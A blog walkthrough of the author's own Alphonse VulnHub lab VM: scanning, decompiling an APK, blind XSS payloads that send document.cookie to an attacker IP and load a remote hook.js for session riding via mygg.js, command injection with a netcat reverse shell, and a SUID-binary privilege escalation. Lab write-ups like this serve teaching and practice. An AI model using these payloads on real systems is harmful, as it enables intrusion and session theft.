---
layout: post
title: Walkthrough of Alphonse
categories: [vm]
tags: [vulnhub,sp,alphonse]
fullview: false
description: A walkthrough of the alphonse VM on VulnHub
comments: true
---

# Intro

The following is a walkthrough for one of the machines I have created and submitted to VulnHub for my <a href="https://www.vulnhub.com/series/sp,189/">SP series</a>. Since I created the VM, I'm biased on how to solve it, but I have tried to tackle it from an objective point of view. Before we go on, a fun thing to know about this VM is that it was inspired from a real penetration test and the reason mygg.js was built. Personally, I regard the difficulty level as intermediate.

## Enumeration

### nmap

A port scan gives us a lot to go after, with multiple interesting services. We can already see some files on the FTP server with anonymous login enabled and a webserver, which we should do some content discovery on. We should also see if we can gather some information from the smb service.

```
root@kali:~# nmap -sTVC 192.168.0.36 -p- -n
Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-16 15:58 EDT
Nmap scan report for 192.168.0.36
Host is up (0.00054s latency).
Not shown: 65531 closed ports
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| drwxrwxr-x    2 ftp      ftp          4096 Sep 05  2019 dev
|_drwxr-xr-x    2 ftp      ftp          4096 Aug 30  2019 pub
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.168.0.34
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
80/tcp  open  http        Apache httpd 2.4.38
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: 403 Forbidden
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 4.9.5-Debian (workgroup: WORKGROUP)
MAC Address: 08:00:27:AC:1F:1D (Oracle VirtualBox virtual NIC)
Service Info: Hosts: 127.0.1.1, ALPHONSE; OS: Unix

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.82 seconds
root@kali:~# 
```

### enum4linux

enum4linux doesn't give us that much information, other than some default shares.

```
root@kali:~# enum4linux 192.168.0.36
---
//192.168.0.36/print$   Mapping: DENIED, Listing: N/A
//192.168.0.36/IPC$ [E] Can't understand response:
---
```

### Web server

We can use my new favorite content discovery tool ffuf to enumerate content on the webserver. Unfortunately, it doesn't find anything useful with the basic big.txt in Kali.

```
root@kali:~/go/bin# ffuf -w /usr/share/wordlists/dirb/big.txt -u http://192.168.0.36/FUZZ
.htaccess               [Status: 403, Size: 296, Words: 22, Lines: 12]
.htpasswd               [Status: 403, Size: 296, Words: 22, Lines: 12]
server-status           [Status: 403, Size: 300, Words: 22, Lines: 12]
:: Progress: [20469/20469] :: Job [1/1] :: 4093 req/sec :: Duration: [0:00:05] :: Errors: 0 ::
root@kali:~/go/bin# 
```

### FTP

We can use the build-in ftp tool to browse and download the DNAnalyzer.apk file. Interesting.

```
root@kali:~# ftp 192.168.0.36
Connected to 192.168.0.36.
220 (vsFTPd 3.0.3)
Name (192.168.0.36:root): anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxrwxr-x    2 ftp      ftp          4096 Sep 05  2019 dev
drwxr-xr-x    2 ftp      ftp          4096 Aug 30  2019 pub
226 Directory send OK.
ftp> cd dev
250 Directory successfully changed.
ftp> get DNAnalyzer.apk
local: DNAnalyzer.apk remote: DNAnalyzer.apk
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for DNAnalyzer.apk (2009772 bytes).
226 Transfer complete.
2009772 bytes received in 0.05 secs (40.5301 MB/s)
ftp> 
```

### Disecting the APK

APKs are Android packages containing Java code, which we can reverse engineer and take a investigate the source code.

Since APK is basically just a zip file, we can extract it like a zip file:

```
root@kali:~# unzip DNAnalyzer.apk -d dnanalyzer
root@kali:~# cd dnanalyzer
```

We need to convert the dex format to Java, using dex2jar.

```
root@kali:~/dnanalyzer# apt install dex2jar
root@kali:~/dnanalyzer# d2j-dex2jar classes.dex
root@kali:~/dnanalyzer# ls
AndroidManifest.xml  classes.dex  classes-dex2jar.jar  META-INF  okhttp3  res  resources.arsc
```

We now have a jar file, which we can open with jd-gui. Inside com/dnanalyzer.jwt/network/NetworkRequest.class we can find some interesting file paths and functionality.

```java
public void doGetProtectedQuote(@NonNull String paramString, @Nullable Callback paramCallback) {
setCallback(paramCallback);
doGetRequestWithToken("http://alphonse/dnanalyzer/api/protected/result.php", new HashMap(), paramString, paramCallback);
}

public void doLogin(@NonNull String paramString1, @NonNull String paramString2, Callback paramCallback) {
setCallback(paramCallback);
HashMap hashMap = new HashMap();
hashMap.put("username", paramString1);
hashMap.put("password", paramString2);
doPostRequest("http://alphonse/dnanalyzer/api/login.php", hashMap, paramCallback);
}

public void doSignUp(@NonNull String paramString1, @NonNull String paramString2, String paramString3, @Nullable Callback paramCallback) {
setCallback(paramCallback);
HashMap hashMap = new HashMap();
hashMap.put("username", paramString1);
hashMap.put("password", paramString2);
hashMap.put("dna_string", paramString3);
doPostRequest("http://alphonse/dnanalyzer/api/register.php", hashMap, paramCallback);
}
```

### Understanding the API

The register.php file do exist as proven by doing a request to it. It complains about some missing arguments. We also learn that the API use JSON for information exchange, which will be important when we will be constructing requests.
```
root@kali:~# curl http://192.168.0.36/dnanalyzer/api/register.php
<br />
<b>Notice</b>:  Undefined index: username in <b>/var/www/html/dnanalyzer/api/register.php</b> on line <b>22</b><br />
<br />
<b>Notice</b>:  Undefined index: password in <b>/var/www/html/dnanalyzer/api/register.php</b> on line <b>23</b><br />
<br />
<b>Notice</b>:  Undefined index: dna_string in <b>/var/www/html/dnanalyzer/api/register.php</b> on line <b>24</b><br />
{"message":"User was successfully registered."}root@kali:~# 
```

Let's try an make a test user:
```
root@kali:~# curl -i -d "username=test&password=test&dna_string=test" http://192.168.0.36/dnanalyzer/api/register.php
HTTP/1.1 200 OK
Date: Wed, 16 Sep 2020 20:42:03 GMT
Server: Apache/2.4.38 (Debian)
Access-Control-Allow-Origin: *
Access-Control-Allow-Methods: POST
Access-Control-Max-Age: 3600
Access-Control-Allow-Headers: Content-Type, Access-Control-Allow-Headers, Authorization, X-Requested-With
Content-Length: 47
Content-Type: application/json; charset=UTF-8

{"message":"User was successfully registered."}
root@kali:~# 
```

And now logging in with it:

```
root@kali:~# curl -i -d "username=test&password=test" http://192.168.0.36/dnanalyzer/api/login.php
HTTP/1.1 200 OK
Date: Wed, 16 Sep 2020 20:42:55 GMT
Server: Apache/2.4.38 (Debian)
Access-Control-Allow-Origin: *
Access-Control-Allow-Methods: POST
Access-Control-Max-Age: 3600
Access-Control-Allow-Headers: Content-Type, Access-Control-Allow-Headers, Authorization, X-Requested-With
Content-Length: 333
Content-Type: application/json; charset=UTF-8

{"message":"Successful login.","jwt":"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJBbHBob25zZSIsImF1ZCI6IlRIRV9BVURJRU5DRSIsImlhdCI6MTYwMDI4ODk3NSwibmJmIjoxNjAwMjg4OTg1LCJleHAiOjE2MDAyODkwMzUsImRhdGEiOnsiaWQiOiI0MyIsInVzZXJuYW1lIjoidGVzdDMifX0.WQYhW4hdCDG4qL3cHUsaEjzYyH5rralCzcgiu52nF-w","username":"test","expireAt":1600289035}
root@kali:~# 
```

Looks like it's working, and we are given a JWT token. What can we do from here? Let's go back to do some more enumeration of the newly discovered web directory.

```
root@kali:~# ffuf -w /usr/share/wordlists/dirb/big.txt -u http://192.168.0.36/dnanalyzer/FUZZ
.htaccess               [Status: 403, Size: 307, Words: 22, Lines: 12]
.htpasswd               [Status: 403, Size: 307, Words: 22, Lines: 12]
api                     [Status: 301, Size: 321, Words: 20, Lines: 10]
portal                  [Status: 301, Size: 324, Words: 20, Lines: 10]
vendor                  [Status: 301, Size: 324, Words: 20, Lines: 10]
:: Progress: [20469/20469] :: Job [1/1] :: 2046 req/sec :: Duration: [0:00:10] :: Errors: 0 ::
root@kali:~# 
```

The portal folder looks interesting, which provides a html page with a login form. However, providing our newly created user didn't get us inside. Maybe this is an admin portal?

```
root@kali:~# curl http://192.168.0.36/dnanalyzer/portal/
<form action="" method="POST"><input name="user" type="text" placeholder="username" /></br><input name="pass" type="password" placeholder="password" /></br><input name="login" type="submit" value="Login" /></form>
root@kali:~# 
```

### Out-of-bound XSS

If this is an admin portal and an administrator is viewing user information, maybe we can trigger an XSS. Since we are very much blind here, we will send a simple out-of-bounds payload, loading an image from our attacking machine (192.168.0.34). Be sure to open a listener on the attacking machine first `nc -nlvp 80`.

```
root@kali:~# curl -i -d "username=test2&password=test2&dna_string=<img src='http://192.168.0.34/x'>" http://192.168.0.36/dnanalyzer/api/register.php
HTTP/1.1 200 OK
Date: Wed, 16 Sep 2020 21:36:13 GMT
Server: Apache/2.4.38 (Debian)
Access-Control-Allow-Origin: *
Access-Control-Allow-Methods: POST
Access-Control-Max-Age: 3600
Access-Control-Allow-Headers: Content-Type, Access-Control-Allow-Headers, Authorization, X-Requested-With
Content-Length: 47
Content-Type: application/json; charset=UTF-8

{"message":"User was successfully registered."}
```

After some minutes we can see a request made to our machine:
```
root@kali:~# nc -nlvp 80
GET /x HTTP/1.1
Host: 192.168.0.34
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://127.0.0.1/dnanalyzer/portal/index.php
Connection: keep-alive
```

Now, let's try to check if there are any cookies by sending document.cookie back to our server.

```
root@kali:~# curl -i -d "username=test4&password=test4&dna_string=<svg/onload=\"var x=document.createElement('img');x.src='http://192.168.0.34/'%2Bdocument.cookie;document.body.appendChild(x);\">" http://192.168.0.36/dnanalyzer/api/register.php
```

We see no cookies in the request sent back to us. This could mean that there are no cookies, but that would be weird because there is a login, which indicates sessions. What is more probable is the use of httponly flag on the cookies, or that the site uses session tokens sent via headers.

```
root@kali:~# nc -nlvp 80
GET / HTTP/1.1
Host: 192.168.0.34
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://127.0.0.1/dnanalyzer/portal/index.php
Connection: keep-alive
Pragma: no-cache
Cache-Control: no-cache
```

### Proxy via XSS

However, there is another trick we can use. We can use a tool called mygg.js to use XSS to browse through the admin's browser to take a look at the site via their authenticated session. Follow the basic installation at https://github.com/dsolstad/mygg.js and edit the configuration in the top section of the file. Change the domain variable to your attacking IP address before starting it the tool `$ node mygg.js`. After this we can change the XSS payload and use mygg's hook instead.

```
root@kali:~# curl -i -d "username=test4&password=test&dna_string=<svg/onload=\"var x=document.createElement('script');x.src='http://192.168.0.34/hook.js';document.head.appendChild(x);\">" http://192.168.0.36/dnanalyzer/api/register.php
```
After some minutes we can see that we have a new hooked browser in the console of mygg. We also see which URL it was hooked from. 


```
root@kali:~# node mygg.js
[+] Payload stager:
<svg/onload="var x=document.createElement('script');x.src='//192.168.0.34/hook.js';document.head.appendChild(x);">

[+] Proxy server listening on address 127.0.0.1 port 8081
[+] HTTP server listening on address 0.0.0.0 port 80
[+] HTTPS server listening on address 0.0.0.0 port 443
[+] Hooked new browser [192.168.0.36][Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0][http://127.0.0.1/dnanalyzer/portal/index.php]
```

Now, change the proxy settings in your attacking web browser to 127.0.0.1:8081 and browse to http://127.0.0.1/dnanalyzer/portal/index.php and you should be logged in! What we see in the admin panel is what appears to be a button to analyse the user provided DNA strings. Hit Ctrl+Shift+I to bring up the Web Developer toolbar to view the request to the API. Instead of using our attacking browser going forward, we can now switch to using curl via mygg.js to play around with the request.

```
root@kali:~# curl -i -x 127.0.0.1:8081 -d '{"id":"6","val":"GATC"}' http://127.0.0.1/dnanalyzer/portal/analyze_dna.php
HTTP/1.1 200 OK
cache-control: no-store, no-cache, must-revalidate
connection: Keep-Alive
content-type: text/html; charset=UTF-8
date: Fri, 18 Sep 2020 21:26:10 GMT
expires: Thu, 19 Nov 1981 08:52:00 GMT
keep-alive: timeout=5, max=100
pragma: no-cache
server: Apache/2.4.38 (Debian)
Content-Length: 6

Superb
root@kali:~# 
```

### Command execution

Very soon we will find out that we can execute OS commands simply by ending the DNA string and appending a command. Probably because API sends the data directly to a binary for analysis.

```
root@kali:~# curl -i -x 127.0.0.1:8081 -d '{"id":"6","val":"GATC; ls"}' http://127.0.0.1/dnanalyzer/portal/analyze_dna.php
HTTP/1.1 200 OK
cache-control: no-store, no-cache, must-revalidate
connection: Keep-Alive
content-type: text/html; charset=UTF-8
date: Fri, 18 Sep 2020 21:43:39 GMT
expires: Thu, 19 Nov 1981 08:52:00 GMT
keep-alive: timeout=5, max=100
pragma: no-cache
server: Apache/2.4.38 (Debian)
Content-Length: 9

index.php
root@kali:~# 
```

We can easily get a reverse shell from here.

```
root@kali:~# curl -i -x 127.0.0.1:8081 -d '{"id":"6","val":"GATC; nc 192.168.0.34 1337 -e /bin/bash"}' http://127.0.0.1/dnanalyzer/portal/analyze_dna.php
```

```
root@kali:~# nc -nlvp 1337
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

We snatch the local flag:

```
cat /home/alphonse/flag.txt
dmx2urv87f2
```

### Priv Esc

After digging around on the machine, we find something interesting in the /home/alphonse/Documents folder. There is a binary with suid bit which asks for a password. 

```
ls -l
total 20
-rwsr-xr-x 1 root root 16976 Sep  3  2019 rootme
./rootme asdf
Wrong password
```

Let's see if we can see the password in clear text in the binary. Usually I'd use `strings` for this, but it doesn't seem to be installed. However, we can use `xxd ./rootme` instead, where we find:

```
00002000: 0100 0200 2e2f 726f 6f74 6d65 203c 7061  ...../rootme <pa
00002010: 7373 776f 7264 3e00 614e 6867 4b69 3478  ssword>.aNhgKi4x
00002020: 754f 0048 6572 6520 796f 7520 676f 3a00  uO.Here you go:.
00002030: 6261 7368 002f 6269 6e2f 7368 0057 726f  bash./bin/sh.Wro
00002040: 6e67 2070 6173 7377 6f72 6400 011b 033b  ng password....;
```

```bash
./rootme aNhgKi4xuO
id
uid=0(root) gid=0(root) groups=0(root)
cat /root/flag.txt
91bmZfpe2L
```

Bingo!

## Summary

Alphonse is a workstation used for local development and unfortunately he was sharing an Android application through an open FTP server. By reverse engineering this, we learned about an API that was vulnerable to blind XSS, triggered by a visitor on an admin panel. Since the session cookies were protected, we used a tool to ride the authenticated user's session and proxying our attacking web browser through the victim's web browser. From here we learned about another API that communicated with a binary on the OS, which was vulnerable to OS command injection. The final step was to abuse another binary to achieve root privileges.
